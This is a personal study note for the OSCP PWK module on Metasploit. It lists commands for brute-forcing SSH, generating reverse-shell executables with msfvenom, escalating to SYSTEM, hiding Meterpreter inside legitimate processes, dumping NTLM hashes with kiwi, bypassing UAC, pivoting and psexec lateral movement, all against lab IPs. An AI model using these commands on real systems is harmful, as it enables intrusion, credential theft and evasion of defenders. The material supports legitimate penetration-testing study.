---
title: "PWK Module 20 — The Metasploit Framework"
created: "2026-04-05"
type: reference-note
status: active
tags:
  - reference-note
  - metasploit
  - msfconsole
  - meterpreter
  - msfvenom
  - post-exploitation
  - pivoting
  - oscp
source: "PWK Module 20 — The Metasploit Framework"
---

# PWK Module 20 — The Metasploit Framework

## Overview

Metasploit Framework (MSF) is a unified platform for exploitation, post-exploitation, and payload generation. It replaces disparate standalone tools with a consistent interface. Understanding its architecture — modules, sessions, payloads, databases — is the foundation for efficient use.

---

## 1. Setup and Core Concepts

### Database Initialization

```bash
sudo msfdb init                        # initialize PostgreSQL DB + MSF schema
sudo systemctl enable postgresql       # persist DB across reboots
msfconsole -q                          # launch (quiet — suppress banner)
msf6> db_status                        # verify DB connection
```

### Workspaces

Workspaces isolate results from different assessments. Without them, data from multiple engagements bleeds together.

```bash
workspace                              # list workspaces
workspace pen200                       # switch to existing workspace
workspace -a pen200                    # create + switch to new workspace
workspace -d pen200                    # delete workspace
```

### Module Categories

| Category | Purpose |
|----------|---------|
| `auxiliary` | Scanning, enumeration, fuzzing, sniffing — no payload |
| `exploit` | Active exploitation of vulnerabilities |
| `post` | Post-exploitation actions on active sessions |
| `payload` | Code delivered to target (shell, Meterpreter, etc.) |
| `encoder` | Obfuscate payload to evade detection |
| `nop` | NOP sled generators for buffer overflows |
| `evasion` | Bypass antivirus and endpoint controls |

```bash
show -h                                # list all module categories
show auxiliary                         # list all auxiliary modules
search type:auxiliary smb              # filter by type and keyword
use 56                                 # activate module by index from search
use auxiliary/scanner/smb/smb_version  # activate by full path
info                                   # describe current module
show options                           # show required + optional options
```

---

## 2. Database Backend Commands

Run `db_nmap` to scan and auto-store results:

```bash
db_nmap -v -sV 192.168.50.202         # nmap scan, results stored in DB
hosts                                  # list all discovered hosts
services                               # list all discovered services
services -p 445                        # filter services by port
services -p 445 --rhosts               # set RHOSTS from DB results for port 445
vulns                                  # vulnerabilities identified by modules
creds                                  # stored credentials (user:pass pairs)
```

---

## 3. Auxiliary Modules

### SMB Version Detection

```bash
search type:auxiliary smb
use auxiliary/scanner/smb/smb_version  # or use INDEX
set RHOSTS 192.168.50.202
run
vulns                                  # check for auto-detected vulnerabilities (e.g., SMB signing)
```

### SSH Login Brute Force

```bash
use auxiliary/scanner/ssh/ssh_login
set USERNAME george
set PASS_FILE /usr/share/wordlists/rockyou.txt
set RHOSTS 192.168.50.202
set RPORT 2222
run
# Metasploit opens a session on success — unlike Hydra which just prints credentials
creds                                  # view stored valid credentials
```

**Key difference from Hydra:** MSF SSH login automatically opens a session on success and stores credentials in the DB.

---

## 4. Exploit Modules

### Workflow

```bash
search "Apache 2.4.49"
# Index 0 = exploit module, Index 1 = auxiliary check module
use 0                                  # activate exploit module
info                                   # ALWAYS read this before running
```

**Critical fields in `info` output:**
- **Side effects** — IOCs written, artifacts on disk
- **Stability** — `repeatable-session` = can run more than once
- **Reliability** — `no-side-effects` or `crash-safe`
- **Check supported** — whether `check` command is available for dry-run
- **Available targets** — OS/version variants the exploit handles

### Setting Payload and Options

```bash
set payload linux/x64/shell_reverse_tcp
show options                           # see payload options added (LHOST, LPORT)
set LHOST 192.168.45.208              # your Kali IP — double-check if multi-interface
set LPORT 4444                         # default; change as needed
set RHOSTS 192.168.50.202
set RPORT 80
set SSL false
run
```

**Metasploit auto-starts the listener** — no separate Netcat needed.

### Sessions and Jobs

```bash
sessions -l                            # list all active sessions
sessions -i 1                          # interact with session ID 1
sessions -k 1                          # kill session ID 1
sessions -K                            # kill ALL sessions
Ctrl+Z                                 # background current session

run -j                                 # launch exploit as background job
jobs                                   # list active jobs (background listeners, etc.)
```

**Why sessions matter:** In a real pentest with many targets, sessions let you jump between compromised machines instantly rather than hunting through terminal windows.

---

## 5. Staged vs Non-Staged Payloads

| Type | Notation | Size | Stability | Use When |
|------|----------|------|-----------|----------|
| Non-staged | `shell_reverse_tcp` (underscore) | Larger | More stable | Buffer has room; reliability matters |
| Staged | `shell/reverse_tcp` (slash) | Stage 1: ~38 bytes | Slightly less stable | Small buffer; space constrained |

**The notation rule:** Forward slash (`/`) = staged. Underscore (`_`) in the final component = non-staged.

```bash
show payloads                          # list payloads compatible with current exploit
# shell_reverse_tcp  ← non-staged (all-in-one)
# shell/reverse_tcp  ← staged (first stage ~38 bytes, calls back for second)
```

**How staging works:**
1. Stage 1 (tiny) lands on target, opens connection back to Kali
2. Metasploit sends Stage 2 (full shellcode) over that connection
3. Stage 2 executes — full interactive shell

---

## 6. Meterpreter Payload

Meterpreter is a full post-exploitation framework delivered as a payload. It:
- Runs **entirely in memory** (no binary written to disk)
- **Encrypts all communication** by default (TLS)
- Is dynamically extensible at runtime via `load`

### Variants

```bash
linux/x64/meterpreter_reverse_tcp      # raw TCP, non-staged, Linux x64
linux/x64/meterpreter_reverse_https    # HTTPS tunnel (looks like web traffic)
windows/x64/meterpreter_reverse_tcp    # non-staged Windows
windows/x64/meterpreter/reverse_tcp    # staged Windows (slash = staged)
```

### Core Meterpreter Commands

```bash
sysinfo                                # hostname, OS, arch, domain
getuid                                 # current user context
idletime                               # how long user has been idle
shell                                  # drop into interactive OS shell
Ctrl+Z                                 # background channel (not session)
channel -l                             # list active channels
channel -i 1                           # interact with channel 1

# File transfers
lcd /home/kali/Downloads               # change LOCAL directory
download /etc/passwd                   # download file from target
upload /tools/unix-privesc-check /tmp/ # upload file to target
```

### HTTPS Payload for Evasion

```bash
set payload linux/x64/meterpreter_reverse_https
# Traffic appears as HTTPS to defenders
# LURI option: set path for logical separation of listeners
# 404 Not Found if defender visits Kali's IP in browser
```

**Detection caveat:** Meterpreter is well-known; AV detection rates are high. Best practice: get initial foothold with raw TCP shell → disable AV → deploy Meterpreter.

---

## 7. Executable Payloads with msfvenom

`msfvenom` generates standalone payload files (EXE, ELF, scripts, web shells).

### Common Commands

```bash
# List available payloads
msfvenom -l payloads --platform windows --arch x64

# Create non-staged Windows reverse shell EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.208 LPORT=443 -f exe -o shell.exe

# Create staged Windows reverse shell EXE
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.208 LPORT=443 -f exe -o staged.exe

# Create Meterpreter Windows EXE
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.208 LPORT=443 -f exe -o met.exe
```

### Receiving Connections

| Payload type | Receiver |
|-------------|---------|
| Non-staged raw shell | Netcat (`nc -lnvp 443`) |
| Staged shell | `multi/handler` only |
| Meterpreter | `multi/handler` only |

**Why Netcat fails for staged payloads:** Netcat is a raw TCP listener — it has no logic to receive a tiny stage-1 stub, send back stage-2, and complete the handshake. Only `multi/handler` understands the staging protocol.

### multi/handler Setup

```bash
use multi/handler
set payload windows/x64/shell/reverse_tcp    # must match payload used in msfvenom
set LHOST 192.168.45.208
set LPORT 443
run -j                                       # start listener in background
jobs                                         # verify listener is running
sessions -l                                  # view incoming sessions
```

**Tip:** `run` without `-j` blocks the terminal. `run -j` lets you continue working.

---

## 8. Core Meterpreter Post-Exploitation (Windows)

### Privilege Escalation: getsystem

```bash
whoami /priv                           # verify SeImpersonatePrivilege is Enabled
getsystem                              # attempt auto-escalation to NT AUTHORITY\SYSTEM
# Uses Named Pipe Impersonation (like Potato attacks, but wrapped in one command)
getuid                                 # confirm: NT AUTHORITY\SYSTEM
```

**Why getsystem works:** It internally uses techniques identical to Potato attacks — it creates a named pipe, coerces authentication, captures the SYSTEM token, and impersonates it. Requires SeImpersonatePrivilege.

### Process Migration: migrate

**Problem:** Payload runs inside a named process (`met.exe`) — obvious to defenders and killed if that process exits.

**Solution:** Migrate into a legitimate, always-running process.

```bash
ps                                     # list all processes with PIDs
migrate 7120                           # migrate Meterpreter into PID 7120 (e.g., OneDrive.exe)
# Original met.exe process disappears from process list
# Payload now hides inside OneDrive.exe
```

**Constraint:** Can only migrate to processes at same or lower privilege level than your current process.

```bash
execute -H -f notepad                  # spawn hidden notepad if no good process exists
# -H = hidden (no window shown to user)
# Then migrate into the newly spawned notepad PID
```

### Idletime Check

```bash
idletime
# Output: "9 minutes 53 seconds"
# → User is away → safe to run visible commands (CMD windows, etc.)
```

---

## 9. Post-Exploitation Modules

### UAC Bypass

If you have a Meterpreter session at **Medium integrity** on an admin account:

```bash
# Background the session, note session ID
Ctrl+Z
background

# Search for UAC bypass modules
search uac

# Use sdclt bypass (effective on modern Windows)
use exploit/windows/local/bypassuac_sdclt
set SESSION 1                          # session ID from above
set LHOST 192.168.45.208
run
# Output: new Meterpreter session at High integrity
```

**Verify integrity level in session:**
```powershell
Import-Module NtObjectManager
Get-NtTokenIntegrityLevel             # Medium → need bypass; High → already elevated
```

### Kiwi (Mimikatz) Extension

```bash
getsystem                              # need SYSTEM rights first
load kiwi                              # load Mimikatz as Meterpreter extension
help                                   # show kiwi commands
creds_msv                              # dump LM + NTLM hashes for all users
# Output: user luiza → NTLM: <hash>
```

**Use case:** Dump NTLM hashes → crack offline with hashcat → use credentials for lateral movement.

---

## 10. Pivoting with Metasploit

### Manual Routes

After identifying a second network interface on a compromised host:

```bash
# From msfconsole (session backgrounded)
route add 172.16.5.0/24 1             # route to 172.16.5.0/24 via session ID 1
route print                            # verify routing table
route flush                            # remove all routes

# Now scan internal network through the pivot
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.5.200
set PORTS 445,3389
run
```

### Autoroute (Automatic)

```bash
use multi/manage/autoroute
set SESSION 1
run
# Auto-detects all subnets reachable from session 1 and adds routes
```

### SOCKS Proxy via Metasploit

Combine autoroute with a SOCKS proxy to use external tools (xfreerdp, nmap, etc.) through the pivot:

```bash
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5                          # SOCKS5
run -j

# Edit /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

proxychains xfreerdp /v:172.16.5.200 /u:luiza /p:Password1
```

### Port Forwarding (portfwd)

Inside an active Meterpreter session:

```bash
portfwd add -l 3389 -p 3389 -r 172.16.5.200
# Now connect to 127.0.0.1:3389 on Kali to reach 172.16.5.200:3389
xfreerdp /v:127.0.0.1 /u:luiza /p:Password1
```

### Lateral Movement: psexec

```bash
use exploit/windows/smb/psexec
set SMBUser luiza
set SMBPass Password1
set RHOSTS 172.16.5.200
set payload windows/x64/meterpreter/bind_tcp   # MUST be bind shell for pivoting
run
```

**Critical rule:** When pivoting via routes, use **bind shells** (`bind_tcp`), not reverse shells. A reverse shell payload on the internal target has no route back to Kali and will fail. With bind shell, Kali connects outbound through the route.

---

## 11. Resource Scripts

Resource scripts automate sequences of MSF commands. Written in MSF console syntax (+ optional Ruby).

### Create listener.rc

```bash
# /home/kali/listener.rc
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST 192.168.45.208
set LPORT 443
set AutoRunScript post/windows/manage/migrate  # auto-migrate on session open
set ExitOnSession false                         # keep listener alive after session
run -z -j                                       # background + don't interact
```

### Run Resource Script

```bash
msfconsole -q -r /home/kali/listener.rc        # execute on launch
# Or from within msfconsole:
resource /home/kali/listener.rc
```

### Built-in Resource Scripts

```bash
ls /usr/share/metasploit-framework/scripts/resource/
# port scanning, brute forcing, protocol enumeration, etc.
# Always read and modify before using
```

### Global Options

```bash
setg RHOSTS 192.168.50.0/24           # set across all modules
unsetg RHOSTS                          # clear global
```

---

## Full Command Quick Reference

```bash
# Setup
msfdb init && msfconsole -q
workspace -a pentest1
db_nmap -v -sV TARGET

# Navigation
search type:exploit name:apache
use 0 / use exploit/multi/handler
info / show options / show payloads

# Run
set payload linux/x64/shell_reverse_tcp
set LHOST KALI_IP && set RHOSTS TARGET
run / run -j / check

# Sessions
sessions -l / sessions -i 1 / sessions -K
Ctrl+Z                        # background

# Meterpreter
sysinfo / getuid / idletime
getsystem / migrate PID / execute -H -f notepad
download /etc/passwd / upload tool.sh /tmp/
load kiwi / creds_msv
channel -l / channel -i 1

# msfvenom
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=IP LPORT=443 -f exe -o met.exe

# Pivoting
route add SUBNET/CIDR SESSION_ID
use multi/manage/autoroute
portfwd add -l LOCAL -p REMOTE_PORT -r REMOTE_IP
use auxiliary/server/socks_proxy
```

---

## Connections

- [[PWK-Module-19-Port-Redirection-SSH-Tunneling]] — manual pivoting techniques; Metasploit automates the same concepts
- [[PWK-Module-17-Windows-PrivEsc]] — getsystem, SeImpersonatePrivilege, UAC bypass background
- [[PWK-Module-16-Password-Attacks]] — hashcat to crack NTLM hashes dumped by Kiwi/creds_msv
- [[Metasploit-Mental-Model]] — when to use MSF vs manual tools, payload selection logic

---

## Practice Labs

| Room / Machine | Platform | What it practices |
|----------------|----------|-------------------|
| [[Metasploit]] | TryHackMe | msfdb init, msfconsole basics, auxiliary modules, MS17-010 (EternalBlue) exploit |
| [[Metasploit Exploitation]] | TryHackMe | db_nmap integration, vulnerability scanning, msfvenom payload generation |
| [[Metasploit  Meterpreter]] | TryHackMe | Meterpreter in-memory architecture, process migration, channel commands |
| [[Alfred]] | TryHackMe | Jenkins exploit → Meterpreter shell → token impersonation (getsystem via incognito) |
| [[AV Evasion Shellcode]] | TryHackMe | msfvenom shellcode generation, encoding/packing to evade AV |

---

*From: PWK Module 20*
